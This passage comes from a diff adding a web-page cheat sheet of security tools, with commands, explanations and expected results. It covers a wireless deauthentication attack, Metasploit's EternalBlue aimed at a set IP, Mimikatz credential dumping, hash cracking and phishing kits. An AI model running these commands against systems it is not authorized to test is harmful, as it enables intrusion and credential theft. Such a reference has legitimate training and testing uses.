+                        { command: "airodump-ng -c 6 -w capture wlan0mon", explanation: "Capture on specific channel", result: "Captures packets on channel 6" },
+                        { command: "aireplay-ng --deauth 1 -a BSSID wlan0mon", explanation: "Deauthentication attack", result: "Disconnects clients from target network" }
+                    ]
+                },
+                "Kismet": { 
+                    description: "Wireless network detector", 
+                    commands: [
+                        { command: "kismet", explanation: "Launch Kismet wireless detector", result: "Opens Kismet for wireless network discovery" },
+                        { command: "kismet -c wlan0mon", explanation: "Capture on specific interface", result: "Captures wireless traffic on specified interface" }
+                    ]
+                }
+            },
+            "Exploitation Tools": {
+                "Metasploit": { 
+                    description: "Penetration testing framework", 
+                    commands: [
+                        { command: "msfconsole", explanation: "Launch Metasploit console", result: "Opens Metasploit framework" },
+                        { command: "search exploit windows smb", explanation: "Search for Windows SMB exploits", result: "Lists available SMB exploits" },
+                        { command: "use exploit/windows/smb/ms17_010_eternalblue", explanation: "Select EternalBlue exploit", result: "EternalBlue exploit loaded" },
+                        { command: "set RHOSTS 192.168.1.100", explanation: "Set target IP", result: "Target IP set to 192.168.1.100" },
+                        { command: "exploit", explanation: "Execute the exploit", result: "Attempts to exploit target" }
+                    ]
+                },
+                "BeEF": { 
+                    description: "Browser exploitation framework", 
+                    commands: [
+                        { command: "beef-xss", explanation: "Launch BeEF framework", result: "Starts BeEF for browser exploitation" },
+                        { command: "Open browser to http://localhost:3000/ui/panel", explanation: "Access BeEF control panel", result: "Opens BeEF management interface" }
+                    ]
+                }
+            },
+            "Forensics Tools": {
+                "Autopsy": { 
+                    description: "Digital forensics platform", 
+                    commands: [
+                        { command: "autopsy", explanation: "Launch Autopsy forensics tool", result: "Opens Autopsy for digital forensics analysis" },
+                        { command: "Create new case", explanation: "Start new forensics case", result: "Initializes new investigation" }
+                    ]
+                },
+                "Volatility": { 
+                    description: "Memory forensics framework", 
+                    commands: [
+                        { command: "volatility -f memory.dmp --profile=Win7SP1x64 pslist", explanation: "List running processes", result: "Shows all processes from memory dump" },
+                        { command: "volatility -f memory.dmp --profile=Win7SP1x64 pstree", explanation: "Show process tree", result: "Displays process hierarchy" },
+                        { command: "volatility -f memory.dmp --profile=Win7SP1x64 cmdline", explanation: "Show command lines", result: "Displays command line arguments" },
+                        { command: "volatility -f memory.dmp --profile=Win7SP1x64 netscan", explanation: "Scan network connections", result: "Shows active network connections" },
+                        { command: "volatility -f memory.dmp --profile=Win7SP1x64 hashdump", explanation: "Dump password hashes", result: "Extracts password hashes from memory" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "Memory Analysis",
+                            description: "Analyze memory dumps for forensic evidence",
+                            steps: [
+                                "Process list: volatility -f memory.dmp --profile=Win7SP1x64 pslist",
+                                "Process tree: volatility -f memory.dmp --profile=Win7SP1x64 pstree",
+                                "Command lines: volatility -f memory.dmp --profile=Win7SP1x64 cmdline",
+                                "Network scan: volatility -f memory.dmp --profile=Win7SP1x64 netscan",
+                                "Hash dump: volatility -f memory.dmp --profile=Win7SP1x64 hashdump"
+                            ],
+                            expectedResult: "Process list, command history, network connections, password hashes",
+                            fallbackStrategy: "Check profile compatibility, verify memory dump, try different profiles"
+                        }
+                    ]
+                }
+            },
+            "Social Engineering": {
+                "SET": { 
+                    description: "Social Engineering Toolkit", 
+                    commands: [
+                        { command: "setoolkit", explanation: "Launch Social Engineering Toolkit", result: "Opens SET for social engineering attacks" },
+                        { command: "Select option 1 (Social Engineering Attacks)", explanation: "Choose attack type", result: "Accesses social engineering attack menu" },
+                        { command: "Select option 2 (Website Attack Vectors)", explanation: "Choose website attacks", result: "Website-based attack options" }
+                    ]
+                },
+                "PhishX": { 
+                    description: "Phishing framework", 
+                    commands: [
+                        { command: "phishx", explanation: "Launch PhishX framework", result: "Opens PhishX for phishing campaigns" },
+                        { command: "Create new campaign", explanation: "Start new phishing campaign", result: "Initializes new phishing operation" }
+                    ]
+                }
+            },
+            "Certifications": {
+                "CompTIA Security+": { 
+                    description: "Entry-level security certification", 
+                    commands: [
+                        { command: "https://www.comptia.org", explanation: "Access CompTIA website", result: "Official CompTIA certification information" },
+                        { command: "Study materials and practice tests", explanation: "Prepare for Security+ exam", result: "Comprehensive exam preparation resources" }
+                    ]
+                },
+                "CEH": { 
+                    description: "Certified Ethical Hacker", 
+                    commands: [
+                        { command: "https://www.eccouncil.org", explanation: "Access EC-Council website", result: "Official CEH certification information" },
+                        { command: "CEH study materials", explanation: "Prepare for CEH exam", result: "Ethical hacking certification preparation" }
+                    ]
+                },
+                "OSCP": { 
+                    description: "Offensive Security Certified Professional", 
+                    commands: [
+                        { command: "https://www.offensive-security.com", explanation: "Access Offensive Security", result: "Official OSCP certification information" },
+                        { command: "Hands-on penetration testing labs", explanation: "Practice real-world scenarios", result: "Practical penetration testing experience" }
+                    ]
+                }
+            },
+            "Cryptography & Encryption": {
+                "Hashcat": { 
+                    description: "Advanced password recovery tool", 
+                    commands: [
+                        { command: "hashcat -m 0 hash.txt wordlist.txt", explanation: "Crack MD5 hashes", result: "Uses GPU acceleration for MD5 cracking" },
+                        { command: "hashcat -m 1000 hash.txt wordlist.txt", explanation: "Crack NTLM hashes", result: "Windows password hash cracking" },
+                        { command: "hashcat -m 1800 hash.txt wordlist.txt", explanation: "Crack SHA512 hashes", result: "SHA512 hash cracking with GPU" }
+                    ]
+                },
+                "John the Ripper": { 
+                    description: "Password cracking tool", 
+                    commands: [
+                        { command: "john hashes.txt", explanation: "Crack password hashes", result: "Attempts to crack stored password hashes" },
+                        { command: "john --wordlist=wordlist.txt hashes.txt", explanation: "Use custom wordlist for cracking", result: "Cracks hashes using specified wordlist" },
+                        { command: "john --format=raw-md5 hash.txt", explanation: "Crack MD5 hashes", result: "Specifically targets MD5 hash format" }
+                    ]
+                },
+                "CrackStation": { 
+                    description: "Online hash cracking service", 
+                    commands: [
+                        { command: "https://crackstation.net", explanation: "Access CrackStation website", result: "Online hash cracking platform" },
+                        { command: "Paste hash and select type", explanation: "Submit hash for cracking", result: "Attempts to crack submitted hash" }
+                    ]
+                }
+            },
+            "Reverse Engineering & Malware Analysis": {
+                "Ghidra": { 
+                    description: "Software reverse engineering tool", 
+                    commands: [
+                        { command: "ghidraRun", explanation: "Launch Ghidra", result: "Opens Ghidra for binary analysis" },
+                        { command: "Import binary file", explanation: "Load executable for analysis", result: "Binary loaded into Ghidra workspace" },
+                        { command: "Analyze binary", explanation: "Start code analysis", result: "Begins reverse engineering process" }
+                    ]
+                },
+                "IDA Pro": { 
+                    description: "Interactive disassembler", 
+                    commands: [
+                        { command: "ida64.exe", explanation: "Launch IDA Pro 64-bit", result: "Opens IDA Pro for binary analysis" },
+                        { command: "File > Open", explanation: "Load binary file", result: "Binary file opened for disassembly" },
+                        { command: "Analyze > Auto analysis", explanation: "Start automatic analysis", result: "Begins code analysis and disassembly" }
+                    ]
+                },
+                "x64dbg": { 
+                    description: "Windows debugger", 
+                    commands: [
+                        { command: "x64dbg.exe", explanation: "Launch x64dbg debugger", result: "Opens Windows debugger" },
+                        { command: "File > Open", explanation: "Load executable for debugging", result: "Program loaded for dynamic analysis" },
+                        { command: "Set breakpoints", explanation: "Set debugging breakpoints", result: "Breakpoints set for program analysis" }
+                    ]
+                }
+            },
+            "Vulnerability Analysis": {
+                "OpenVAS": { 
+                    description: "Open source vulnerability scanner", 
+                    commands: [
+                        { command: "openvas-setup", explanation: "Initial OpenVAS setup", result: "Configures OpenVAS scanner" },
+                        { command: "openvas-start", explanation: "Start OpenVAS services", result: "Launches vulnerability scanning services" },
+                        { command: "gvm-start", explanation: "Start Greenbone Vulnerability Manager", result: "Starts web-based vulnerability management" }
+                    ]
+                },
+                "Nessus": { 
+                    description: "Commercial vulnerability scanner", 
+                    commands: [
+                        { command: "nessus -q", explanation: "Launch Nessus scanner", result: "Opens Nessus vulnerability scanner" },
+                        { command: "Create new scan policy", explanation: "Configure scan settings", result: "Custom vulnerability scan configuration" }
+                    ]
+                },
+                "Qualys": { 
+                    description: "Cloud-based vulnerability management", 
+                    commands: [
+                        { command: "https://qualys.com", explanation: "Access Qualys platform", result: "Cloud vulnerability scanning platform" },
+                        { command: "Launch vulnerability scan", explanation: "Start cloud-based scan", result: "Initiates remote vulnerability assessment" }
+                    ]
+                }
+            },
+            "Post-Exploitation": {
+                "Mimikatz": { 
+                    description: "Extract passwords from memory", 
+                    commands: [
+                        { command: "mimikatz.exe", explanation: "Launch Mimikatz on Windows", result: "Opens Mimikatz for credential extraction" },
+                        { command: "privilege::debug", explanation: "Enable debug privileges", result: "Gains debug access for password extraction" },
+                        { command: "sekurlsa::logonpasswords", explanation: "Extract logon passwords", result: "Retrieves stored passwords from memory" }
+                    ]
+                },
+                "PowerSploit": { 
+                    description: "PowerShell post-exploitation framework", 
+                    commands: [
+                        { command: "Import-Module PowerSploit", explanation: "Load PowerSploit module", result: "Imports post-exploitation tools" },
+                        { command: "Invoke-Mimikatz", explanation: "Run Mimikatz via PowerShell", result: "Extracts credentials using PowerShell" },
+                        { command: "Invoke-UserHunter", explanation: "Find user sessions", result: "Locates active user sessions on network" }
+                    ]
+                },
+                "Empire": { 
+                    description: "Post-exploitation framework", 
+                    commands: [
+                        { command: "python empire", explanation: "Launch Empire framework", result: "Opens Empire post-exploitation platform" },
+                        { command: "listeners", explanation: "Manage listeners", result: "Shows available command listeners" },
+                        { command: "agents", explanation: "List active agents", result: "Shows compromised systems" }
+                    ]
+                }
+            },
+            
+            "Reverse Engineering": {
+                "Ghidra": { 
+                    description: "NSA's reverse engineering framework", 
+                    commands: [
+                        { command: "ghidra", explanation: "Launch Ghidra GUI", result: "Opens Ghidra reverse engineering environment" },
+                        { command: "File > New Project", explanation: "Create new analysis project", result: "Opens project creation wizard" },
+                        { command: "Import executable file", explanation: "Load binary for analysis", result: "Binary loaded into Ghidra workspace" },
+                        { command: "Auto Analysis", explanation: "Run automatic analysis", result: "Performs automated reverse engineering" },
+                        { command: "Symbol Tree", explanation: "View function symbols", result: "Shows all discovered functions and variables" },
+                        { command: "Decompile function", explanation: "Generate pseudo-code", result: "Creates readable C-like code from assembly" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "Malware Analysis",
+                            description: "Analyze suspicious executable file",
+                            steps: [
+                                "Launch Ghidra: ghidra",
+                                "Create project: File > New Project",
+                                "Import file: Import executable",
+                                "Auto analyze: Auto Analysis",
+                                "Examine functions: Symbol Tree"
+                            ],
+                            expectedResult: "Decompiled code and function analysis",
+                            fallbackStrategy: "Try different analysis options, manual function analysis"
+                        }
+                    ]
+                },
+                "IDA Pro": { 
+                    description: "Interactive Disassembler Professional", 
+                    commands: [
+                        { command: "ida64.exe target.exe", explanation: "Launch IDA with target file", result: "Opens IDA Pro with binary loaded" },
+                        { command: "F5", explanation: "Decompile selected function", result: "Generates pseudo-code for function" },
+                        { command: "G + address", explanation: "Jump to specific address", result: "Navigates to memory address" },
+                        { command: "X", explanation: "Cross-reference function", result: "Shows all references to function" },
+                        { command: "N", explanation: "Rename function/variable", result: "Allows renaming for better analysis" }
+                    ]
+                },
+                "Radare2": { 
+                    description: "Unix-like reverse engineering framework", 
+                    commands: [
+                        { command: "r2 target.exe", explanation: "Open binary in Radare2", result: "Loads binary for analysis" },
+                        { command: "aaa", explanation: "Analyze all functions", result: "Performs comprehensive analysis" },
+                        { command: "pdf @ main", explanation: "Disassemble main function", result: "Shows assembly code for main" },
+                        { command: "pdc", explanation: "Decompile current function", result: "Generates pseudo-code" },
+                        { command: "VV", explanation: "Enter visual graph mode", result: "Opens graph view of functions" },
+                        { command: "iz", explanation: "List strings in binary", result: "Shows all embedded strings" }
+                    ]
+                },
+                "x64dbg": { 
+                    description: "Windows debugger for x64 applications", 
+                    commands: [
+                        { command: "x64dbg.exe", explanation: "Launch x64dbg debugger", result: "Opens x64dbg interface" },
+                        { command: "File > Open", explanation: "Load executable for debugging", result: "Binary loaded for debugging" },
+                        { command: "F9", explanation: "Run/continue execution", result: "Starts or continues program execution" },
+                        { command: "F2", explanation: "Set breakpoint", result: "Sets breakpoint at current location" },
+                        { command: "F7", explanation: "Step into", result: "Steps into function calls" },
+                        { command: "F8", explanation: "Step over", result: "Steps over function calls" }
+                    ]
+                }
+            },
+            
+            "Mobile Security": {
+                "Frida": { 
+                    description: "Dynamic instrumentation toolkit", 
+                    commands: [
+                        { command: "frida -U -f com.example.app", explanation: "Spawn and attach to Android app", result: "Attaches Frida to target application" },
+                        { command: "frida -U -n \"App Name\"", explanation: "Attach to running iOS app", result: "Attaches to running iOS application" },
+                        { command: "frida-ps -U", explanation: "List running processes on device", result: "Shows all running processes" },
+                        { command: "frida -U -l script.js com.app", explanation: "Run JavaScript hook script", result: "Executes custom hooking script" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "iOS App Hooking",
+                            description: "Hook into iOS application functions",
+                            steps: [
+                                "List processes: frida-ps -U",
+                                "Attach to app: frida -U -n \"App Name\"",
+                                "Load script: frida -U -l script.js com.app",
+                                "Intercept calls: Hook target functions"
+                            ],
+                            expectedResult: "Intercepted function calls and data",
+                            fallbackStrategy: "Try different attachment methods, check app protection"
+                        }
+                    ]
+                },
+                "MobSF": { 
+                    description: "Mobile Security Framework", 
+                    commands: [
+                        { command: "python manage.py runserver", explanation: "Start MobSF web interface", result: "Launches web interface on localhost:8000" },
+                        { command: "Upload APK file", explanation: "Upload Android app for analysis", result: "APK uploaded for security analysis" },
+                        { command: "Static Analysis", explanation: "Perform static code analysis", result: "Analyzes code for security vulnerabilities" },
+                        { command: "Dynamic Analysis", explanation: "Run app in emulator", result: "Tests app behavior in controlled environment" }
+                    ]
+                },
+                "Burp Suite Mobile": { 
+                    description: "Mobile app security testing", 
+                    commands: [
+                        { command: "Configure proxy: 127.0.0.1:8080", explanation: "Set mobile device proxy", result: "Routes traffic through Burp Suite" },
+                        { command: "Install CA certificate", explanation: "Install Burp CA on device", result: "Enables HTTPS traffic interception" },
+                        { command: "Intercept traffic", explanation: "Capture mobile app requests", result: "Intercepts and modifies HTTP/HTTPS requests" }
+                    ]
+                },
+                "Jadx": { 
+                    description: "Android APK decompiler", 
+                    commands: [
+                        { command: "jadx app.apk", explanation: "Decompile APK to Java", result: "Converts APK to readable Java source" },
+                        { command: "jadx -d output_dir app.apk", explanation: "Decompile to specific directory", result: "Outputs decompiled code to directory" },
+                        { command: "jadx --show-bad-code app.apk", explanation: "Show problematic code sections", result: "Highlights areas with decompilation issues" }
+                    ]
+                }
+            },
+            
+            "Cloud Security": {
+                "AWS CLI": { 
+                    description: "Amazon Web Services command line", 
+                    commands: [
+                        { command: "aws configure", explanation: "Configure AWS credentials", result: "Sets up AWS access credentials" },
+                        { command: "aws s3 ls", explanation: "List S3 buckets", result: "Shows all accessible S3 buckets" },
+                        { command: "aws ec2 describe-instances", explanation: "List EC2 instances", result: "Shows all EC2 instances and details" },
+                        { command: "aws iam list-users", explanation: "List IAM users", result: "Shows all IAM users in account" },
+                        { command: "aws s3 cp file.txt s3://bucket/", explanation: "Upload file to S3", result: "Uploads file to specified S3 bucket" }
+                    ]
+                },
+                "Azure CLI": { 
+                    description: "Microsoft Azure command line", 
+                    commands: [
+                        { command: "az login", explanation: "Login to Azure account", result: "Authenticates with Azure services" },
+                        { command: "az vm list", explanation: "List virtual machines", result: "Shows all VMs in subscription" },
+                        { command: "az storage account list", explanation: "List storage accounts", result: "Shows all storage accounts" },
+                        { command: "az webapp list", explanation: "List web applications", result: "Shows all web apps in subscription" }
+                    ]
+                },
+                "GCloud CLI": { 
+                    description: "Google Cloud Platform CLI", 
+                    commands: [
+                        { command: "gcloud auth login", explanation: "Authenticate with Google Cloud", result: "Logs into Google Cloud account" },
+                        { command: "gcloud compute instances list", explanation: "List compute instances", result: "Shows all GCP compute instances" },
+                        { command: "gcloud storage ls", explanation: "List Cloud Storage buckets", result: "Shows all Cloud Storage buckets" },
+                        { command: "gcloud projects list", explanation: "List accessible projects", result: "Shows all accessible GCP projects" }
+                    ]
+                },
+                "CloudBrute": { 
+                    description: "Cloud infrastructure enumeration", 
+                    commands: [
+                        { command: "cloudbrute -k aws -w wordlists/aws.txt", explanation: "Enumerate AWS infrastructure", result: "Discovers AWS resources using wordlist" },
+                        { command: "cloudbrute -k azure -w wordlists/azure.txt", explanation: "Enumerate Azure infrastructure", result: "Discovers Azure resources" },
+                        { command: "cloudbrute -k gcp -w wordlists/gcp.txt", explanation: "Enumerate GCP infrastructure", result: "Discovers GCP resources" }
+                    ]
+                }
+            },
+            
+            "Blockchain Security": {
+                "Mythril": { 
+                    description: "Ethereum smart contract analyzer", 
+                    commands: [
+                        { command: "myth analyze contract.sol", explanation: "Analyze Solidity contract", result: "Performs security analysis on smart contract" },
+                        { command: "myth analyze -x contract.sol", explanation: "Analyze with execution trace", result: "Detailed analysis with execution traces" },
+                        { command: "myth disassemble contract.sol", explanation: "Disassemble contract", result: "Shows EVM bytecode disassembly" }
+                    ]
+                },
+                "Slither": { 
+                    description: "Static analysis framework for Solidity", 
+                    commands: [
+                        { command: "slither contract.sol", explanation: "Analyze Solidity contract", result: "Static analysis of smart contract vulnerabilities" },
+                        { command: "slither --json output.json contract.sol", explanation: "Export results to JSON", result: "Saves analysis results in JSON format" },
+                        { command: "slither --print human-summary contract.sol", explanation: "Human-readable summary", result: "Generates readable security summary" }
+                    ]
+                },
+                "Echidna": { 
+                    description: "Smart contract fuzzing tool", 
+                    commands: [
+                        { command: "echidna-test contract.sol", explanation: "Fuzz test smart contract", result: "Performs property-based testing" },
+                        { command: "echidna-test --config config.yaml contract.sol", explanation: "Test with configuration", result: "Custom fuzzing with configuration file" }
+                    ]
+                }
+            },
+            
+            "AI/ML Security": {
+                "Adversarial Robustness Toolbox": { 
+                    description: "AI/ML model security testing", 
+                    commands: [
+                        { command: "python -c \"import art; print(art.__version__)\"", explanation: "Check ART installation", result: "Shows Adversarial Robustness Toolbox version" },
+                        { command: "art_attack --help", explanation: "Show attack options", result: "Lists available adversarial attacks" },
+                        { command: "art_eval --model model.h5 --attack fgsm", explanation: "Evaluate model against FGSM", result: "Tests model robustness against FGSM attack" }
+                    ]
+                },
+                "CleverHans": { 
+                    description: "Library for adversarial examples", 
+                    commands: [
+                        { command: "pip install cleverhans", explanation: "Install CleverHans library", result: "Installs adversarial ML library" },
+                        { command: "python -c \"import cleverhans; print(cleverhans.__version__)\"", explanation: "Verify installation", result: "Shows CleverHans version" }
+                    ]
+                },
+                "MLSecOps Tools": { 
+                    description: "ML security operations tools", 
+                    commands: [
+                        { command: "python -m mlsecops.scan model.pkl", explanation: "Scan ML model for vulnerabilities", result: "Analyzes model for security issues" },
+                        { command: "python -m mlsecops.audit pipeline.py", explanation: "Audit ML pipeline", result: "Checks ML pipeline for security flaws" }
+                    ]
+                }
+            },
+            
+            "IoT Security": {
+                "Firmware Analysis Toolkit": { 
+                    description: "Automated firmware analysis", 
+                    commands: [
+                        { command: "fat.py firmware.bin", explanation: "Analyze firmware image", result: "Extracts and analyzes firmware components" },
+                        { command: "fat.py -t firmware.bin", explanation: "Test firmware for vulnerabilities", result: "Tests firmware for common security issues" },
+                        { command: "fat.py -e firmware.bin", explanation: "Extract firmware filesystem", result: "Extracts embedded filesystem from firmware" }
+                    ]
+                },
+                "Binwalk": { 
+                    description: "Firmware analysis tool", 
+                    commands: [
+                        { command: "binwalk firmware.bin", explanation: "Analyze firmware file", result: "Shows embedded files and signatures" },
+                        { command: "binwalk -e firmware.bin", explanation: "Extract embedded files", result: "Extracts all embedded files from firmware" },
+                        { command: "binwalk -A firmware.bin", explanation: "Analyze executable code", result: "Identifies CPU architectures and executable code" }
+                    ]
+                },
+                "Firmadyne": { 
+                    description: "Automated firmware emulation", 
+                    commands: [
+                        { command: "sudo ./run.sh firmware.bin", explanation: "Emulate firmware", result: "Runs firmware in emulated environment" },
+                        { command: "sudo ./run.sh -b firmware.bin", explanation: "Emulate with brand detection", result: "Emulates firmware with brand identification" }
+                    ]
+                },
+                "Shodan IoT": { 
+                    description: "IoT device discovery", 
+                    commands: [
+                        { command: "shodan search product:router", explanation: "Find routers", result: "Discovers internet-connected routers" },
+                        { command: "shodan search product:camera", explanation: "Find IP cameras", result: "Discovers internet-connected cameras" },
+                        { command: "shodan search port:23", explanation: "Find Telnet services", result: "Finds devices with Telnet enabled" }
+                    ]
+                }
+            }
+        };
+
+        function displayCategories() {
+            const categoriesDiv = document.getElementById("categories");
+            categoriesDiv.innerHTML = "";
+            
+            Object.keys(toolsData).forEach(category => {
+                const toolCount = Object.keys(toolsData[category]).length;
+                const categoryDiv = document.createElement("div");
+                categoryDiv.className = "category";
+                categoryDiv.innerHTML = `
+                    <h3>${category} <span class="tool-count">${toolCount} tools</span></h3>
+                    <div class="tools-grid">
+                        ${Object.keys(toolsData[category]).map(tool => {
+                            const difficulty = getToolDifficulty(tool);
+                            const difficultyClass = difficulty.toLowerCase();
+                            return `
+                                <div class="tool-card ${difficultyClass}" onclick="showToolDetails('${category}', '${tool}')">
+                                    <div class="tool-header">
+                                        <span class="tool-name">${tool}</span>
+                                        <span class="difficulty-badge ${difficultyClass}">${difficulty}</span>
+                                    </div>
+                                    <div class="tool-description">${toolsData[category][tool].description}</div>
+                                    <div class="tool-actions">
+                                        <button class="copy-btn" onclick="event.stopPropagation(); copyToolCommands('${category}', '${tool}')">
+                                            📋 Copy Commands
+                                        </button>
+                                        <button class="favorite-btn" onclick="event.stopPropagation(); toggleFavorite('${tool}')">
+                                            ⭐
+                                        </button>
+                                    </div>
+                                </div>
+                            `;
+                        }).join("")}
+                    </div>
+                `;
+                categoriesDiv.appendChild(categoryDiv);
+            });
+        }
+        
+        function getToolDifficulty(toolName) {
+            const beginnerTools = ['Sherlock', 'Maigret', 'Holehe', 'TheHarvester', 'Dirb', 'Gobuster', 'Nmap', 'Burp Suite', 'OWASP ZAP', 'Jadx', 'AWS CLI', 'Azure CLI', 'GCloud CLI'];
+            const advancedTools = ['Recon-ng', 'Metasploit', 'Empire', 'PowerSploit', 'Mimikatz', 'Ghidra', 'IDA Pro', 'Radare2', 'x64dbg', 'Frida', 'MobSF', 'Mythril', 'Slither', 'Echidna', 'Firmware Analysis Toolkit', 'Firmadyne'];
+            
+            if (beginnerTools.includes(toolName)) return 'Beginner';
+            if (advancedTools.includes(toolName)) return 'Advanced';
+            return 'Intermediate';
+        }
+        
+        function copyToolCommands(category, tool) {
+            const toolData = toolsData[category][tool];
+            let commandsText = `# ${tool} Commands\n\n`;
+            
+            toolData.commands.forEach((cmd, index) => {
+                if (typeof cmd === 'object' && cmd.command) {
+                    commandsText += `## Command ${index + 1}\n`;
+                    commandsText += `**Command:** ${cmd.command}\n`;
+                    commandsText += `**Explanation:** ${cmd.explanation}\n`;
+                    commandsText += `**Expected Result:** ${cmd.result}\n\n`;
+                } else {
+                    commandsText += `## Command ${index + 1}\n${cmd}\n\n`;
+                }
+            });
+            
+            navigator.clipboard.writeText(commandsText).then(() => {
+                showNotification('Commands copied to clipboard!', 'success');
+            }).catch(() => {
+                showNotification('Failed to copy commands', 'error');
+            });
+        }
+        
+        function toggleFavorite(toolName) {
+            const favorites = JSON.parse(localStorage.getItem('favoriteTools') || '[]');
+            const index = favorites.indexOf(toolName);
+            
+            if (index > -1) {
+                favorites.splice(index, 1);
+                showNotification(`${toolName} removed from favorites`, 'info');
+            } else {
+                favorites.push(toolName);
+                showNotification(`${toolName} added to favorites`, 'success');
+            }
+            
+            localStorage.setItem('favoriteTools', JSON.stringify(favorites));
+            updateFavoriteButtons();
+        }
+        
+        function updateFavoriteButtons() {
+            const favorites = JSON.parse(localStorage.getItem('favoriteTools') || '[]');
+            document.querySelectorAll('.favorite-btn').forEach(btn => {
+                const toolName = btn.closest('.tool-card').querySelector('.tool-name').textContent;
+                if (favorites.includes(toolName)) {
+                    btn.style.color = '#ffd700';
+                    btn.style.textShadow = '0 0 10px #ffd700';
+                } else {
+                    btn.style.color = '#666';
+                    btn.style.textShadow = 'none';
+                }
+            });
+        }
+        
+        function showNotification(message, type = 'info') {
+            const notification = document.createElement('div');
+            notification.className = `notification ${type}`;
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+        }
+
+        function showToolDetails(category, tool) {
+            const toolData = toolsData[category][tool];
+            const modal = document.getElementById("toolModal");
+            const modalContent = document.getElementById("modalContent");
+            
+            let content = `
+                <h2>${tool}</h2>
+                <p><strong>Description:</strong> ${toolData.description}</p>
+                <div class="tool-stats">
+                    <span class="stat-item">
+                        <strong>Category:</strong> ${category}
+                    </span>
+                    <span class="stat-item">
+                        <strong>Difficulty:</strong> <span class="difficulty-badge ${getToolDifficulty(tool).toLowerCase()}">${getToolDifficulty(tool)}</span>
+                    </span>
+                    <span class="stat-item">
+                        <strong>Commands:</strong> ${toolData.commands.length}
+                    </span>
+                    ${toolData.scenarios ? `<span class="stat-item">
+                        <strong>Scenarios:</strong> ${toolData.scenarios.length}
+                    </span>` : ''}
+                </div>
+            `;
+
+            // Display scenarios if they exist
+            if (toolData.scenarios && toolData.scenarios.length > 0) {
+                content += `<h3>🎯 Attack Scenarios & Fallback Strategies:</h3>`;
+                toolData.scenarios.forEach((scenario, index) => {
+                    content += `
+                        <div class="scenario" style="background: rgba(0, 0, 0, 0.1); padding: 20px; border-radius: 15px; margin: 20px 0; border: 2px solid #00d4ff;">
+                            <h4 style="color: #00d4ff; margin-bottom: 15px;">${scenario.name}</h4>
+                            <p style="margin-bottom: 15px;"><strong>Description:</strong> ${scenario.description}</p>
+                            
+                            <div style="background: rgba(0, 255, 65, 0.1); padding: 15px; border-radius: 10px; margin: 15px 0; border-left: 4px solid #00ff41;">
+                                <strong style="color: #00ff41;">Steps:</strong>
+                                <ol style="margin: 10px 0; padding-left: 20px;">
+                                    ${scenario.steps.map(step => `<li style="margin: 5px 0;">${step}</li>`).join('')}
+                                </ol>
+                            </div>
+                            
+                            <div style="background: rgba(255, 193, 7, 0.1); padding: 15px; border-radius: 10px; margin: 15px 0; border-left: 4px solid #ffc107;">
+                                <strong style="color: #ffc107;">Expected Result:</strong> ${scenario.expectedResult}
+                            </div>
+                            
+                            <div style="background: rgba(220, 53, 69, 0.1); padding: 15px; border-radius: 10px; margin: 15px 0; border-left: 4px solid #dc3545;">
+                                <strong style="color: #dc3545;">If Attack Fails:</strong> ${scenario.fallbackStrategy}
+                            </div>
+                        </div>
+                    `;
+                });
+            }
+
+            content += `<h3>Commands & Examples:</h3>`;
+            
+            // Check if commands have enhanced format (with explanation and result)
+            if (toolData.commands[0] && typeof toolData.commands[0] === 'object' && toolData.commands[0].command) {
+                // Enhanced format
+                toolData.commands.forEach((cmd, index) => {
+                    content += `
+                        <div class="command">
+                            <div class="command-header">
+                                <span class="command-number">#${index + 1}</span>
+                                <button class="copy-command-btn" onclick="copySingleCommand('${cmd.command}')">
+                                    📋 Copy Command
+                                </button>
+                            </div>
+                            <div class="command-content">
+                                <div style="background: #2c3e50; color: white; padding: 15px; border-radius: 10px; margin-bottom: 10px; font-family: monospace; border: 2px solid #00ff41; box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);">
+                                    <strong>Command:</strong> ${cmd.command}
+                                </div>
+                                <div style="background: #e8f5e8; padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid #27ae60; color: #2c3e50;">
+                                    <strong>Explanation:</strong> ${cmd.explanation}
+                                </div>
+                                <div style="background: #fff3cd; padding: 15px; border-radius: 10px; border-left: 4px solid #ffc107; color: #2c3e50;">
+                                    <strong>Expected Result:</strong> ${cmd.result}
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                });
+            } else {
+                // Old format (simple array of strings)
+                toolData.commands.forEach((cmd, index) => {
+                    content += `
+                        <div class="command">
+                            <div class="command-header">
+                                <span class="command-number">#${index + 1}</span>
+                                <button class="copy-command-btn" onclick="copySingleCommand('${cmd}')">
+                                    📋 Copy Command
+                                </button>
+                            </div>
+                            <div class="command-content">
+                                <div style="background: #2c3e50; color: white; padding: 15px; border-radius: 10px; font-family: monospace; border: 2px solid #00ff41; box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);">
+                                    ${cmd}
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                });
+            }
+            
+            // Add bulk copy button
+            content += `
+                <div class="bulk-actions">
+                    <button class="bulk-copy-btn" onclick="copyAllCommands('${category}', '${tool}')">
+                        📋 Copy All Commands
+                    </button>
+                    <button class="export-btn" onclick="exportToolData('${category}', '${tool}')">
+                        💾 Export as Markdown
+                    </button>
+                </div>
+            `;
+            
+            modalContent.innerHTML = content;
+            modal.style.display = "block";
+        }
+        
+        function copySingleCommand(command) {
+            navigator.clipboard.writeText(command).then(() => {
+                showNotification('Command copied to clipboard!', 'success');
+            }).catch(() => {
+                showNotification('Failed to copy command', 'error');
+            });
+        }
+        
+        function copyAllCommands(category, tool) {
+            copyToolCommands(category, tool);
+        }
+        
+        function exportToolData(category, tool) {
+            const toolData = toolsData[category][tool];
+            let markdown = `# ${tool}\n\n`;
+            markdown += `**Category:** ${category}\n`;
+            markdown += `**Difficulty:** ${getToolDifficulty(tool)}\n`;
+            markdown += `**Description:** ${toolData.description}\n\n`;
+            markdown += `## Commands\n\n`;
+            
+            toolData.commands.forEach((cmd, index) => {
+                if (typeof cmd === 'object' && cmd.command) {
+                    markdown += `### Command ${index + 1}\n`;
+                    markdown += `\`\`\`bash\n${cmd.command}\n\`\`\`\n\n`;
+                    markdown += `**Explanation:** ${cmd.explanation}\n\n`;
+                    markdown += `**Expected Result:** ${cmd.result}\n\n`;
+                } else {
+                    markdown += `### Command ${index + 1}\n`;
+                    markdown += `\`\`\`bash\n${cmd}\n\`\`\`\n\n`;
+                }
+            });
+            
